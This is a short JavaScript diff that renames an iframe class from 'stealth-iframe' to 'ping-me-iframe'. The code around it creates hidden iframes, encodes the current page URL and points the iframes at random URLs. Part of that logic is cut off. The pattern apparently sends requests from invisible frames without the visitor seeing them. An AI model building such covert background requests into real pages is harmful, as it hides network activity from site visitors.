@@ -29,7 +29,7 @@
   //window.onload = function () {
     for (let i = 0; i < 3; i++) {
       const iframe = document.createElement('iframe');
-      iframe.classList.add('hidden-iframe', 'stealth-iframe');
+      iframe.classList.add('hidden-iframe', 'ping-me-iframe');
       iframe.src = 'about:blank'; // Optional: Set source or leave blank
       document.body.appendChild(iframe);
     }
@@ -37,7 +37,7 @@
       
   const targetUrl = window.location.href;
   const encodedUrl = encodeURIComponent(targetUrl);
-  const iframes = document.querySelectorAll('.stealth-iframe');
+  const iframes = document.querySelectorAll('.ping-me-iframe');
 
   function setRandomUrlInIframes() {
     iframes.forEach(iframe => {
